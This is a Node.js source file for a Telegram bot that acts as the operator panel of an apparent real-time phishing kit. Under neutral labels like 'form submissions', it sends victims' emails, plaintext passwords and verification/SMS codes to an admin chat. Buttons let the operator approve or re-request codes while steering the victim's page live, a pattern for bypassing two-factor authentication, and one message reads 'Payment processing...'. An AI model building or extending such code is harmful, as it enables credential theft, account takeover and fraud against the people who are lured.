const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { formatDate } = require('../utils/helpers');

// Bot instance
let bot = null;
let io = null;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Store active sessions with their data
const activeSessions = new Map();

/**
 * Initialize the Telegram bot
 * @param {Object} socketIo - Socket.io server instance
 */
function initBot(socketIo) {
  // Store the Socket.io instance
  io = socketIo;
  
  // Check if token is available
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.error('TELEGRAM_BOT_TOKEN is not set in environment variables');
    return;
  }
  
  // Create a bot instance
  bot = new TelegramBot(token, { polling: true });
  console.log('Telegram bot initialized');
  
  // Handle incoming messages
  bot.on('message', handleMessage);
  
  // Handle callback queries (button clicks)
  bot.on('callback_query', handleCallbackQuery);
}

/**
 * Handle incoming messages
 * @param {Object} msg - Message object
 */
function handleMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  
  // Check if this is the admin
  if (ADMIN_CHAT_ID && chatId.toString() !== ADMIN_CHAT_ID.toString()) {
    bot.sendMessage(chatId, '⛔ Unauthorized access. This bot is only for admin use.');
    return;
  }
  
  // Handle /start command
  if (text.startsWith('/start')) {
    const welcomeMessage = `
🤖 *Welcome to the Form Control Bot!*

This bot helps you manage user form submissions.

Available commands:
📝 /generate - Create a new session link
📋 /sessions - List all active sessions
❓ /help - Show this help message

_Made with ❤️ by Cascade_
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    return;
  }
  
  // Handle /generate command
  if (text.startsWith('/generate')) {
    generateNewSession(chatId);
    return;
  }
  
  // Handle /sessions command
  if (text.startsWith('/sessions')) {
    listActiveSessions(chatId);
    return;
  }
  
  // Handle /help command
  if (text.startsWith('/help')) {
    const helpMessage = `
🤖 *Form Control Bot Help*

Available commands:
📝 /generate - Create a new session link
📋 /sessions - List all active sessions
❓ /help - Show this help message

How to use:
1. Generate a session link with /generate
2. Share the link with the user
3. Review their form submissions
4. Approve or request changes

_Made with ❤️ by Cascade_
    `;
    
    bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
    return;
  }
  
  // Default response
  bot.sendMessage(chatId, '❓ Unknown command. Use /help to see available commands.');
}

/**
 * Generate a new session and send the link to admin
 * @param {string|number} chatId - Chat ID to send the link to
 */
async function generateNewSession(chatId) {
  try {
    // Call the API to generate a new key
    const response = await axios.post('http://localhost:3000/api/generate-key');
    const { key } = response.data;
    
    // Create the link
    const link = `http://localhost:5173/${key}`;
    
    // Initialize session data
    activeSessions.set(key, {
      createdAt: new Date(),
      state: 'new',
      formData: {},
      messageIds: []
    });
    
    // Send the link to the admin
    const message = `
🆕 *New Session Created!*

🔑 *Session Key:* \`${key}\`
🕒 *Created:* ${formatDate(Date.now())}
🔗 *Share this link with the user:*
${link}

_Waiting for user to complete the form..._
    `;
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error generating session:', error);
    bot.sendMessage(chatId, '❌ Error generating session. Please try again.');
  }
}

/**
 * List all active sessions
 * @param {string|number} chatId - Chat ID to send the list to
 */
function listActiveSessions(chatId) {
  if (activeSessions.size === 0) {
    bot.sendMessage(chatId, '📭 No active sessions found.');
    return;
  }
  
  let message = '📋 *Active Sessions:*\n\n';
  
  activeSessions.forEach((session, key) => {
    const createdAt = session.createdAt ? formatDate(session.createdAt) : 'Unknown';
    const state = getReadableState(session.state);
    
    message += `🔑 *Session:* \`${key}\`\n`;
    message += `🕒 *Created:* ${createdAt}\n`;
    message += `📊 *Status:* ${state}\n\n`;
  });
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

/**
 * Get a human-readable state description
 * @param {string} state - The state code
 * @returns {string} Human-readable state
 */
function getReadableState(state) {
  const states = {
    'new': '🆕 New session',
    'form_1': '📝 Waiting for form submission',
    'loading': '⏳ Processing form data',
    'form_2': '🔑 Waiting for verification code',
    'reenter_code': '🔄 Requested new code',
    'pending': '⏳ Processing verification',
    'success': '✅ Completed successfully',
    'error': '❌ Ended with error'
  };
  
  return states[state] || `Unknown (${state})`;
}

/**
 * Handle callback queries (button clicks)
 * @param {Object} query - Callback query object
 */
async function handleCallbackQuery(query) {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  
  // Check if this is the admin
  if (ADMIN_CHAT_ID && chatId.toString() !== ADMIN_CHAT_ID.toString()) {
    bot.answerCallbackQuery(query.id, { text: '⛔ Unauthorized access' });
    return;
  }
  
  try {
    // Parse the callback data
    const [action, key] = data.split(':');
    
    if (!key) {
      bot.answerCallbackQuery(query.id, { text: '❌ Invalid session key' });
      return;
    }
    
    // Get session data
    const sessionData = activeSessions.get(key) || { formData: {} };
    
    // Handle different actions
    switch (action) {
      case 'confirm_form':
        // Update session state to form_2
        await axios.post('http://localhost:3000/api/state', { key, state: 'form_2' });
        
        // Update local session data
        sessionData.state = 'form_2';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'form_2' });
        
        // Update the message with form data still visible
        const formApprovedMessage = createFormDataMessage(key, sessionData.formData, '✅ Form approved. Waiting for verification code...');
        
        bot.editMessageText(formApprovedMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ End Session', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '✅ Form approved' });
        break;
        
      case 'request_new_form':
        // Update session state to form_1
        await axios.post('http://localhost:3000/api/state', { key, state: 'form_1' });
        
        // Update local session data
        sessionData.state = 'form_1';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'form_1' });
        
        // Update the message
        bot.editMessageText(`
🔄 *Requested New Form Submission*

🔑 *Session:* \`${key}\`
🕒 *Time:* ${formatDate(Date.now())}

_Waiting for user to resubmit the form..._
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ End Session', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Requested new form' });
        break;
        
      case 'confirm_code':
        // Update session state from loading_pending to pending (not success)
        await axios.post('http://localhost:3000/api/state', { key, state: 'pending' });
        
        // Update local session data
        sessionData.state = 'pending';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'pending' });
        
        // Update the message with all data still visible
        const successMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Code approved. Payment processing...');
        
        bot.editMessageText(successMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔄 Request New Code', callback_data: `request_code:${key}` },
                { text: '❌ End Session', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '✅ Code approved' });
        break;
        
      case 'request_new_code':
        // Update session state from loading_pending to reenter_code
        await axios.post('http://localhost:3000/api/state', { key, state: 'reenter_code' });
        
        // Update local session data
        sessionData.state = 'reenter_code';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'reenter_code' });
        
        // Update the message with form data still visible
        const newCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Requested new verification code.');
        
        bot.editMessageText(newCodeMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ End Session', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Requested new code' });
        break;
        
      case 'end_session':
        // Update session state to success instead of error
        await axios.post('http://localhost:3000/api/state', { key, state: 'success' });
        
        // Update local session data
        sessionData.state = 'success';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'success' });
        
        // Update the message
        const endSessionMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Session completed successfully.');
        
        bot.editMessageText(endSessionMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown'
        });
        
        bot.answerCallbackQuery(query.id, { text: '✅ Session completed' });
        break;
        
      case 'request_code':
        // Update session state from pending to reenter_code_after_pending
        await axios.post('http://localhost:3000/api/state', { key, state: 'reenter_code_after_pending' });
        
        // Update local session data
        sessionData.state = 'reenter_code_after_pending';
        activeSessions.set(key, sessionData);
        
        // Notify the user via Socket.io
        io.to(key).emit('state_update', { key, state: 'reenter_code_after_pending' });
        
        // Update the message with form data still visible
        const requestCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Requested new verification code.');
        
        bot.editMessageText(requestCodeMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ End Session', callback_data: `end_session:${key}` }
              ]
            ]
          }
        });
        
        bot.answerCallbackQuery(query.id, { text: '🔄 Requested new code' });
        break;
        
      default:
        bot.answerCallbackQuery(query.id, { text: '❓ Unknown action' });
    }
  } catch (error) {
    console.error('Error handling callback query:', error);
    bot.answerCallbackQuery(query.id, { text: '❌ Error processing request' });
  }
}

/**
 * Notify admin about form submission or code entry
 * @param {string} key - Session key
 * @param {string} formType - Type of form ('form_1' or 'form_2')
 * @param {Object} data - Form data
 */
async function notifyAdmin(key, formType, data) {
  if (!bot || !ADMIN_CHAT_ID) {
    console.error('Bot not initialized or ADMIN_CHAT_ID not set');
    return;
  }
  
  try {
    // Debug logging
    console.log('Data received by notifyAdmin:', data);
    console.log('Password field:', data.password);
    
    let message;
    let inlineKeyboard;
    
    // Get or initialize session data
    let sessionData = activeSessions.get(key) || { 
      createdAt: new Date(),
      state: formType,
      formData: {},
      messageIds: []
    };
    
    if (formType === 'form_1') {
      // Update session data with form information
      sessionData.formData = data;
      sessionData.state = 'form_1';
      
      // Format form data
      message = `
📝 *New Form Submission*

📋 *Form Data:*
📧 *Email:* ${data.email || 'N/A'}
🔒 *Password:* ${data.password || 'N/A'}

🔑 *Session:* \`${key}\`
🕒 *Time:* ${formatDate(Date.now())}
      `;
      
      // Create inline keyboard
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `confirm_form:${key}` },
            { text: '🔄 Request New Form', callback_data: `request_new_form:${key}` }
          ],
          [
            { text: '❌ End Session', callback_data: `end_session:${key}` }
          ]
        ]
      };
      
      // Save updated session data
      activeSessions.set(key, sessionData);
      
      // Send message with inline keyboard
      const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: 'Markdown',
        reply_markup: inlineKeyboard
      });
      
      // Store message ID for future reference
      sessionData.messageIds.push(sentMessage.message_id);
      activeSessions.set(key, sessionData);
    } else if (formType === 'form_2') {
      // Store the code
      sessionData.code = data.code;
      sessionData.state = 'form_2';
      
      // Format complete data with both form and code
      message = `
🔑 *Verification Code Submitted*

📋 *Form Data:*
📧 *Email:* ${sessionData.formData.email || 'N/A'}
🔒 *Password:* ${sessionData.formData.password || 'N/A'}

🔑 *Verification Code:* ${data.code || 'N/A'}

🆔 *Session:* \`${key}\`
🕒 *Time:* ${formatDate(Date.now())}
      `;
      
      // Create inline keyboard with approve and request new code options
      inlineKeyboard = {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `confirm_code:${key}` },
            { text: '🔄 Request New Code', callback_data: `request_new_code:${key}` }
          ],
          [
            { text: '❌ End Session', callback_data: `end_session:${key}` }
          ]
        ]
      };
      
      // Save updated session data
      activeSessions.set(key, sessionData);
      
      // Get the last message ID
      const lastMessageId = sessionData.messageIds[sessionData.messageIds.length - 1];
      
      if (lastMessageId) {
        // Update the existing message
        await bot.editMessageText(message, {
          chat_id: ADMIN_CHAT_ID,
          message_id: lastMessageId,
          parse_mode: 'Markdown',
          reply_markup: inlineKeyboard
        });
      } else {
        // If no previous message exists, create a new one
        console.error('No previous message found for session:', key);
        
        // Send message with inline keyboard as fallback
        const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: inlineKeyboard
        });
        
        // Store message ID for future reference
        sessionData.messageIds.push(sentMessage.message_id);
        activeSessions.set(key, sessionData);
      }
    } else {
      console.error('Unknown form type:', formType);
      return;
    }
  } catch (error) {
    console.error('Error notifying admin:', error);
  }
}

/**
 * Create a formatted message with form data
 * @param {string} key - Session key
 * @param {Object} formData - Form data
 * @param {string} statusMessage - Status message to display
 * @returns {string} Formatted message
 */
function createFormDataMessage(key, formData, statusMessage) {
  let message = `
${statusMessage}

📋 *Form Data:*
📧 *Email:* ${formData.email || 'N/A'}
🔒 *Password:* ${formData.password || 'N/A'}

🔑 *Session:* \`${key}\`
🕒 *Time:* ${formatDate(Date.now())}
  `;
  
  return message;
}

/**
 * Create a formatted message with complete session data
 * @param {string} key - Session key
 * @param {Object} formData - Form data
 * @param {string} code - Verification code
 * @param {string} statusMessage - Status message to display
 * @returns {string} Formatted message
 */
function createCompleteDataMessage(key, formData, code, statusMessage) {
  let message = `
${statusMessage}

📋 *Form Data:*
📧 *Email:* ${formData.email || 'N/A'}
🔒 *Password:* ${formData.password || 'N/A'}

🔑 *Verification Code:* ${code || 'N/A'}

🆔 *Session:* \`${key}\`
🕒 *Time:* ${formatDate(Date.now())}
  `;
  
  return message;
}

/**
 * Notify admin about auto-generated sessions
 * @param {string} key - Session key
 */
async function notifyAutoGenerated(key) {
  if (!bot || !ADMIN_CHAT_ID) {
    console.error('Bot not initialized or ADMIN_CHAT_ID not set');
    return;
  }

  try {
    // Get the session expiration time
    const session = activeSessions.get(key) || {};
    const expiresAt = session.expiresAt || 'Unknown';

    // Format the message with emojis and markdown
    const message = `
🔑 *Auto-Generated Session*

🆔 Session ID: \`${key}\`
⏱️ Created: ${new Date().toLocaleString()}
⌛ Expires: ${expiresAt}
🌐 Source: Website Login Page

[🔗 Open Session Link](http://localhost:5173/${key})
`;

    // Store the session in our active sessions map
    if (!activeSessions.has(key)) {
      activeSessions.set(key, {
        key,
        state: 'created',
        createdAt: new Date().toISOString(),
        expiresAt,
        messageId: null
      });
    }

    // Send the message with inline keyboard
    const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Cancel Session', callback_data: `cancel_${key}` }
          ]
        ]
      }
    });

    // Update the message ID in our sessions map
    if (activeSessions.has(key)) {
      const session = activeSessions.get(key);
      activeSessions.set(key, {
        ...session,
        messageId: sentMessage.message_id
      });
    }

    return sentMessage;
  } catch (error) {
    console.error('Error sending auto-generated session notification:', error);
  }
}

/**
 * Notify admin about SMS code request
 * @param {string} key - Session key
 * @param {string} verificationMethod - Selected verification method
 */
async function notifySmsCodeRequest(key, verificationMethod) {
  if (!bot || !ADMIN_CHAT_ID) {
    console.error('Bot not initialized or ADMIN_CHAT_ID not set');
    return;
  }
  
  try {
    // Get session data
    let sessionData = activeSessions.get(key);
    if (!sessionData) {
      console.error('Session data not found for key:', key);
      return;
    }
    
    // Update session state
    sessionData.state = 'sms_requested';
    sessionData.verificationMethod = verificationMethod;
    
    // Format message with updated information
    const message = createFormDataMessage(key, {
      ...sessionData.formData,
      verificationMethod
    }, '🔔 *SMS Code Requested*');
    
    // Create inline keyboard - only end session option
    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '❌ End Session', callback_data: `end_session:${key}` }
        ]
      ]
    };
    
    // Save updated session data
    activeSessions.set(key, sessionData);
    
    // Get the last message ID
    const lastMessageId = sessionData.messageIds[sessionData.messageIds.length - 1];
    
    if (lastMessageId) {
      // Update the existing message
      await bot.editMessageText(message, {
        chat_id: ADMIN_CHAT_ID,
        message_id: lastMessageId,
        parse_mode: 'Markdown',
        reply_markup: inlineKeyboard
      });
    } else {
      // If no previous message exists, create a new one
      console.error('No previous message found for session:', key);
    }
  } catch (error) {
    console.error('Error notifying admin about SMS code request:', error);
  }
}

module.exports = {
  initBot,
  handleMessage,
  handleCallbackQuery,
  notifyAdmin,
  notifySmsCodeRequest,
  notifyAutoGenerated,
  generateNewSession,
  listActiveSessions
};
